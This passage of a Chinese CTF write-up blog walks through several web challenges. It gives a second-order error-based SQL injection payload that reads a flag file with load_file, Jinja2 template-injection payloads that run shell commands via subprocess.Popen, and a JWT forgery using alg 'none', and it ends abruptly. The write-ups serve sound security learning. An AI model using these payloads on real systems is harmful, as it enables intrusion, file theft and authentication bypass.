<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;config.php&quot;</span>; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&quot;user_name&quot;</span>]) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&quot;phone&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="variable">$pattern</span> = <span class="string">&#x27;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#x27;</span>;</span><br><span class="line">    <span class="variable">$user_name</span> = <span class="variable">$_POST</span>[<span class="string">&quot;user_name&quot;</span>];</span><br><span class="line">    <span class="variable">$phone</span> = <span class="variable">$_POST</span>[<span class="string">&quot;phone&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="variable">$pattern</span>,<span class="variable">$user_name</span>) || preg_match(<span class="variable">$pattern</span>,<span class="variable">$phone</span>))&#123; </span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&#x27;no sql inject!&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;select * from `user` where `user_name`=&#x27;<span class="subst">&#123;$user_name&#125;</span>&#x27; and `phone`=&#x27;<span class="subst">&#123;$phone&#125;</span>&#x27;&quot;</span>;</span><br><span class="line">        <span class="variable">$fetch</span> = <span class="variable">$db</span>-&gt;query(<span class="variable">$sql</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$fetch</span>) &amp;&amp; <span class="variable">$fetch</span>-&gt;num_rows&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="variable">$row</span> = <span class="variable">$fetch</span>-&gt;fetch_assoc();</span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$row</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;error&#x27;</span>;</span><br><span class="line">            print_r(<span class="variable">$db</span>-&gt;error);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;&lt;p&gt;姓名:&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;user_name&#x27;</span>].<span class="string">&quot;&lt;/p&gt;&lt;p&gt;, 电话:&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;phone&#x27;</span>].<span class="string">&quot;&lt;/p&gt;&lt;p&gt;, 地址:&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;address&#x27;</span>].<span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;未找到订单!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&quot;信息不全&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>change.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&quot;user_name&quot;</span>]) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&quot;address&quot;</span>]) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&quot;phone&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="variable">$pattern</span> = <span class="string">&#x27;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#x27;</span>;</span><br><span class="line">    <span class="variable">$user_name</span> = <span class="variable">$_POST</span>[<span class="string">&quot;user_name&quot;</span>];</span><br><span class="line">    <span class="variable">$address</span> = addslashes(<span class="variable">$_POST</span>[<span class="string">&quot;address&quot;</span>]);</span><br><span class="line">    <span class="variable">$phone</span> = <span class="variable">$_POST</span>[<span class="string">&quot;phone&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="variable">$pattern</span>,<span class="variable">$user_name</span>) || preg_match(<span class="variable">$pattern</span>,<span class="variable">$phone</span>))&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&#x27;no sql inject!&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;select * from `user` where `user_name`=&#x27;<span class="subst">&#123;$user_name&#125;</span>&#x27; and `phone`=&#x27;<span class="subst">&#123;$phone&#125;</span>&#x27;&quot;</span>;</span><br><span class="line">        <span class="variable">$fetch</span> = <span class="variable">$db</span>-&gt;query(<span class="variable">$sql</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$fetch</span>) &amp;&amp; <span class="variable">$fetch</span>-&gt;num_rows&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="variable">$row</span> = <span class="variable">$fetch</span>-&gt;fetch_assoc();</span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;update `user` set `address`=&#x27;&quot;</span>.<span class="variable">$address</span>.<span class="string">&quot;&#x27;, `old_address`=&#x27;&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;address&#x27;</span>].<span class="string">&quot;&#x27; where `user_id`=&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;user_id&#x27;</span>];</span><br><span class="line">        <span class="variable">$result</span> = <span class="variable">$db</span>-&gt;query(<span class="variable">$sql</span>);</span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$result</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;error&#x27;</span>;</span><br><span class="line">            print_r(<span class="variable">$db</span>-&gt;error);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;订单修改成功&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;未找到订单!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&quot;信息不全&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span>	</span><br></pre></td></tr></table></figure>

<p><code>confirm.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"><span class="comment">//var_dump($_POST);</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&quot;user_name&quot;</span>]) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&quot;address&quot;</span>]) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&quot;phone&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="variable">$pattern</span> = <span class="string">&#x27;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#x27;</span>;</span><br><span class="line">    <span class="variable">$user_name</span> = <span class="variable">$_POST</span>[<span class="string">&quot;user_name&quot;</span>];</span><br><span class="line">    <span class="variable">$address</span> = <span class="variable">$_POST</span>[<span class="string">&quot;address&quot;</span>];</span><br><span class="line">    <span class="variable">$phone</span> = <span class="variable">$_POST</span>[<span class="string">&quot;phone&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="variable">$pattern</span>,<span class="variable">$user_name</span>) || preg_match(<span class="variable">$pattern</span>,<span class="variable">$phone</span>))&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&#x27;no sql inject!&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;select * from `user` where `user_name`=&#x27;<span class="subst">&#123;$user_name&#125;</span>&#x27; and `phone`=&#x27;<span class="subst">&#123;$phone&#125;</span>&#x27;&quot;</span>;</span><br><span class="line">        <span class="variable">$fetch</span> = <span class="variable">$db</span>-&gt;query(<span class="variable">$sql</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$fetch</span>-&gt;num_rows&gt;<span class="number">0</span>) &#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="variable">$user_name</span>.<span class="string">&quot;已提交订单&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;insert into `user` ( `user_name`, `address`, `phone`) values( ?, ?, ?)&quot;</span>;</span><br><span class="line">        <span class="variable">$re</span> = <span class="variable">$db</span>-&gt;prepare(<span class="variable">$sql</span>);</span><br><span class="line">        <span class="variable">$re</span>-&gt;bind_param(<span class="string">&quot;sss&quot;</span>, <span class="variable">$user_name</span>, <span class="variable">$address</span>, <span class="variable">$phone</span>);</span><br><span class="line">        <span class="variable">$re</span> = <span class="variable">$re</span>-&gt;execute();</span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$re</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;error&#x27;</span>;</span><br><span class="line">            print_r(<span class="variable">$db</span>-&gt;error);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;订单提交成功&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&quot;信息不全&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>config.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">ini_set(<span class="string">&quot;open_basedir&quot;</span>, getcwd() . <span class="string">&quot;:/etc:/tmp&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$DATABASE</span> = <span class="keyword">array</span>(</span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;host&quot;</span> =&gt; <span class="string">&quot;127.0.0.1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;username&quot;</span> =&gt; <span class="string">&quot;root&quot;</span>,</span><br><span class="line">    <span class="string">&quot;password&quot;</span> =&gt; <span class="string">&quot;root&quot;</span>,</span><br><span class="line">    <span class="string">&quot;dbname&quot;</span> =&gt;<span class="string">&quot;ctfusers&quot;</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="variable">$db</span> = <span class="keyword">new</span> mysqli(<span class="variable">$DATABASE</span>[<span class="string">&#x27;host&#x27;</span>],<span class="variable">$DATABASE</span>[<span class="string">&#x27;username&#x27;</span>],<span class="variable">$DATABASE</span>[<span class="string">&#x27;password&#x27;</span>],<span class="variable">$DATABASE</span>[<span class="string">&#x27;dbname&#x27;</span>]);</span><br></pre></td></tr></table></figure>

<p>发现有好多sql命令的地方，但是username还有phone都被过滤了，而且基本上过滤了大部分函数，可以说是没办法绕过了</p>
<p>但是再审计change.php的时候发现一个点：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$fetch</span>) &amp;&amp; <span class="variable">$fetch</span>-&gt;num_rows&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="variable">$row</span> = <span class="variable">$fetch</span>-&gt;fetch_assoc();</span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;update `user` set `address`=&#x27;&quot;</span>.<span class="variable">$address</span>.<span class="string">&quot;&#x27;, `old_address`=&#x27;&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;address&#x27;</span>].<span class="string">&quot;&#x27; where `user_id`=&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;user_id&#x27;</span>];</span><br><span class="line">        <span class="variable">$result</span> = <span class="variable">$db</span>-&gt;query(<span class="variable">$sql</span>);</span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$result</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;error&#x27;</span>;</span><br><span class="line">            print_r(<span class="variable">$db</span>-&gt;error);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;订单修改成功&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;未找到订单!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&quot;信息不全&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>虽然他在前面在change页面的时候对address进行了一次addslashes（）函数的过滤，但是他这里执行sql语句的时候拼接了之前的address，所以这里虽然没办法逃逸，但是我们可以通过将后面的单引号注释的方式，来导致报错，然后构造报错型sql注入</p>
<p>这样他就会将我们的查询结果以报错的形式回显出来；</p>
<p>知道了方式，我们就只需要在提交订单的页面在address里面构造报错查询语句，然后再修改的时候随便修改一个地址，这样它修改的时候触发报错，然后将我们查询的内容回显出来</p>
<p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; where user_id=updatexml(1,concat(0x7e,(select substr(load_file(&#x27;/flag.txt&#x27;),1,20)),0x7e),1)#</span><br></pre></td></tr></table></figure>

<p>（本来是通过直接查询sql列表的，但是没找到，想到了加载本地内容）</p>
]]></content>
      <tags>
        <tag>CISCN2019</tag>
      </tags>
  </entry>
  <entry>
    <title>FlaskLight</title>
    <url>/2022/04/05/FlaskLight/</url>
    <content><![CDATA[<h2 id="CSCCTF-2019-Qual-FlaskLight"><a href="#CSCCTF-2019-Qual-FlaskLight" class="headerlink" title="[CSCCTF 2019 Qual]FlaskLight"></a>[CSCCTF 2019 Qual]FlaskLight</h2><p>因为题目说是flask所以直接寻找注入点</p>
<p>在页面源码发现注入点</p>
<p><img src="/2022/04/05/FlaskLight/1.png" alt="1"></p>
<p>以get方式传入search</p>
<p>那么就判断是什么框架了</p>
<p>输入<code>&#123;&#123;7*'7'&#125;&#125;</code></p>
<p>发现回显7777777</p>
<p>那么就是jinjia2模板注入了</p>
<p>先看一下这道题好像没有没有过滤什么函数，大部分都可以用，</p>
<p>直接构造<code>&#123;&#123;""__class__.__mro__()[2].__subclasses__()&#125;&#125;</code></p>
<p>可以看到object下面有这么多子类型，寻找一下我们可以利用的类，发现有个<code>&lt;class &#39;subprocess.Popen&#39;&gt;</code></p>
<p>那么利用点就在这里了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">subprocess.Popen(“command”)</span><br><span class="line"></span><br><span class="line">说明：class subprocess.Popen(args, bufsize=0, executable=None, stdin=None, stdout=None, stderr=None, preexec_fn=None, close_fds=False, shell=False, cwd=None, env=None, universal_newlines=False, startupinfo=None, creationflags=0)</span><br><span class="line"></span><br><span class="line">原文链接：https://blog.csdn.net/Realiy/article/details/108089591</span><br></pre></td></tr></table></figure>

<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?search=&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[258](&#x27;ls&#x27;,shell=True,stdout=-1).communicate()[0].strip()&#125;&#125;</span><br><span class="line">?search=&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[258](&#x27;cat /flasklight/coomme_geeeett_youur_flek&#x27;,shell=True,stdout=-1).communicate()[0].strip()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>即可拿到flag</p>
]]></content>
      <tags>
        <tag>CSCCTF2019</tag>
      </tags>
  </entry>
  <entry>
    <title>HFCTF2020-EasyLogin</title>
    <url>/2022/04/07/HFCTF2020-EasyLogin/</url>
    <content><![CDATA[<h2 id="HFCTF2020-EasyLogin"><a href="#HFCTF2020-EasyLogin" class="headerlink" title="[HFCTF2020]EasyLogin"></a>[HFCTF2020]EasyLogin</h2><p>进入题目注册登录，先进去看看</p>
<p><img src="/2022/04/07/HFCTF2020-EasyLogin/1.png" alt="1"></p>
<p>直接获取flag，点了之后提示没有权限</p>
<p>猜测需要以admin身份来点击它</p>
<p>然后再app.js中发现了小提示以及部分源码：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  或许该用 koa-static 来处理静态文件</span></span><br><span class="line"><span class="comment"> *  路径该怎么配置？不管了先填个根目录XD</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> username = $(<span class="string">&quot;#username&quot;</span>).val();</span><br><span class="line">    <span class="keyword">const</span> password = $(<span class="string">&quot;#password&quot;</span>).val();</span><br><span class="line">    <span class="keyword">const</span> token = sessionStorage.getItem(<span class="string">&quot;token&quot;</span>);</span><br><span class="line">    $.post(<span class="string">&quot;/api/login&quot;</span>, &#123;username, password, <span class="attr">authorization</span>:token&#125;)</span><br><span class="line">        .done(<span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">const</span> &#123;status&#125; = data;</span><br><span class="line">            <span class="keyword">if</span>(status) &#123;</span><br><span class="line">                <span class="built_in">document</span>.location = <span class="string">&quot;/home&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">        .fail(<span class="function"><span class="keyword">function</span>(<span class="params">xhr, textStatus, errorThrown</span>) </span>&#123;</span><br><span class="line">            alert(xhr.responseJSON.message);</span><br><span class="line">        &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">register</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> username = $(<span class="string">&quot;#username&quot;</span>).val();</span><br><span class="line">    <span class="keyword">const</span> password = $(<span class="string">&quot;#password&quot;</span>).val();</span><br><span class="line">    $.post(<span class="string">&quot;/api/register&quot;</span>, &#123;username, password&#125;)</span><br><span class="line">        .done(<span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">const</span> &#123; token &#125; = data;</span><br><span class="line">            sessionStorage.setItem(<span class="string">&#x27;token&#x27;</span>, token);</span><br><span class="line">            <span class="built_in">document</span>.location = <span class="string">&quot;/login&quot;</span>;</span><br><span class="line">        &#125;)</span><br><span class="line">        .fail(<span class="function"><span class="keyword">function</span>(<span class="params">xhr, textStatus, errorThrown</span>) </span>&#123;</span><br><span class="line">            alert(xhr.responseJSON.message);</span><br><span class="line">        &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">logout</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    $.get(<span class="string">&#x27;/api/logout&#x27;</span>).done(<span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">const</span> &#123;status&#125; = data;</span><br><span class="line">        <span class="keyword">if</span>(status) &#123;</span><br><span class="line">            <span class="built_in">document</span>.location = <span class="string">&#x27;/login&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getflag</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    $.get(<span class="string">&#x27;/api/flag&#x27;</span>).done(<span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">const</span> &#123;flag&#125; = data;</span><br><span class="line">        $(<span class="string">&quot;#username&quot;</span>).val(flag);</span><br><span class="line">    &#125;).fail(<span class="function"><span class="keyword">function</span>(<span class="params">xhr, textStatus, errorThrown</span>) </span>&#123;</span><br><span class="line">        alert(xhr.responseJSON.message);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>本来以为是直接爆破出他的secret然后修改就行了，然后发现爆不出来，有点可惜</p>
<p>我就卡在这里了，看了wp师傅们说里面还有<code>controllers/api.js</code>目录藏了源码，也不知道师傅们是怎么知道的，如果有知道的师傅希望不吝赐教</p>
<p>拿到源码：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">&#x27;crypto&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> jwt = <span class="built_in">require</span>(<span class="string">&#x27;jsonwebtoken&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> APIError = <span class="built_in">require</span>(<span class="string">&#x27;../rest&#x27;</span>).APIError;</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">    <span class="string">&#x27;POST /api/register&#x27;</span>: <span class="keyword">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">        <span class="keyword">const</span> &#123;username, password&#125; = ctx.request.body;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!username || username === <span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> APIError(<span class="string">&#x27;register error&#x27;</span>, <span class="string">&#x27;wrong username&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">global</span>.secrets.length &gt; <span class="number">100000</span>) &#123;</span><br><span class="line">            <span class="built_in">global</span>.secrets = [];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> secret = crypto.randomBytes(<span class="number">18</span>).toString(<span class="string">&#x27;hex&#x27;</span>);</span><br><span class="line">        <span class="keyword">const</span> secretid = <span class="built_in">global</span>.secrets.length;</span><br><span class="line">        <span class="built_in">global</span>.secrets.push(secret)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> token = jwt.sign(&#123;secretid, username, password&#125;, secret, &#123;<span class="attr">algorithm</span>: <span class="string">&#x27;HS256&#x27;</span>&#125;);</span><br><span class="line"></span><br><span class="line">        ctx.rest(&#123;</span><br><span class="line">            <span class="attr">token</span>: token</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> next();</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;POST /api/login&#x27;</span>: <span class="keyword">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">        <span class="keyword">const</span> &#123;username, password&#125; = ctx.request.body;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!username || !password) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> APIError(<span class="string">&#x27;login error&#x27;</span>, <span class="string">&#x27;username or password is necessary&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> token = ctx.header.authorization || ctx.request.body.authorization || ctx.request.query.authorization;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> sid = <span class="built_in">JSON</span>.parse(Buffer.from(token.split(<span class="string">&#x27;.&#x27;</span>)[<span class="number">1</span>], <span class="string">&#x27;base64&#x27;</span>).toString()).secretid;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">console</span>.log(sid)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(sid === <span class="literal">undefined</span> || sid === <span class="literal">null</span> || !(sid &lt; <span class="built_in">global</span>.secrets.length &amp;&amp; sid &gt;= <span class="number">0</span>)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> APIError(<span class="string">&#x27;login error&#x27;</span>, <span class="string">&#x27;no such secret id&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> secret = <span class="built_in">global</span>.secrets[sid];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> user = jwt.verify(token, secret, &#123;<span class="attr">algorithm</span>: <span class="string">&#x27;HS256&#x27;</span>&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> status = username === user.username &amp;&amp; password === user.password;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(status) &#123;</span><br><span class="line">            ctx.session.username = username;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ctx.rest(&#123;</span><br><span class="line">            status</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> next();</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;GET /api/flag&#x27;</span>: <span class="keyword">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">        <span class="keyword">if</span>(ctx.session.username !== <span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> APIError(<span class="string">&#x27;permission error&#x27;</span>, <span class="string">&#x27;permission denied&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> flag = fs.readFileSync(<span class="string">&#x27;/flag&#x27;</span>).toString();</span><br><span class="line">        ctx.rest(&#123;</span><br><span class="line">            flag</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> next();</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;GET /api/logout&#x27;</span>: <span class="keyword">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">        ctx.session.username = <span class="literal">null</span>;</span><br><span class="line">        ctx.rest(&#123;</span><br><span class="line">            <span class="attr">status</span>: <span class="literal">true</span></span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="keyword">await</span> next();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> secret = crypto.randomBytes(<span class="number">18</span>).toString(<span class="string">&#x27;hex&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> secretid = <span class="built_in">global</span>.secrets.length;</span><br><span class="line"><span class="built_in">global</span>.secrets.push(secret)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> token = jwt.sign(&#123;secretid, username, password&#125;, secret, &#123;<span class="attr">algorithm</span>: <span class="string">&#x27;HS256&#x27;</span>&#125;);</span><br></pre></td></tr></table></figure>

<p>发现这个secret是在注册的时候就生成的，然后再login中调用了注册信息中用户名的jwt，既然没办法爆破，就想办法删除掉这个secret</p>
<p>jwt的构成：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">由两个点分割成三部分，第一步分是经过base64编码之后的JWT头其中含有两个信息一个是type(默认是JWT)声明类型，另一个是声明加密的算法alg(algorithm)</span><br><span class="line">可以将JWT中的alg算法修改为none：</span><br><span class="line">JWT支持将算法设定为“None”。如果“alg”字段设为“ None”，那么JWT的第三部分会被置空，这样任何token都是有效的。这样就可以伪造token进行随意访问。</span><br></pre></td></tr></table></figure>

<p>所以这里我们需要将alg设置为none，还得将secretid改为空数组（js是一个弱类型语言，空数组的比较永远为真），然后我们将第二个点后面的东西直接删除然后就可以登录上去</p>
<p>登录上去之后点击getflag就可以拿到flag</p>
]]></content>
      <tags>
        <tag>HFCTF2020</tag>
      </tags>
  </entry>
  <entry>
    <title>I_&lt;3_Flask</title>
    <url>/2022/04/08/I-3-Flask/</url>
    <content><![CDATA[<h2 id="RootersCTF2019-I-lt-3-Flask"><a href="#RootersCTF2019-I-lt-3-Flask" class="headerlink" title="[RootersCTF2019]I_&lt;3_Flask"></a>[RootersCTF2019]I_&lt;3_Flask</h2><p>看起来是一个模板注入题目，但是没有找到明显的注入点</p>
<p>直接用工具跑一下试试</p>
<p><img src="/2022/04/08/I-3-Flask/1.png" alt="1"></p>
<p>跑出来了，手动测了一下模板是jinjia2(49=7777777)</p>
<p>可以直接用一般的rce脚本直接打：</p>
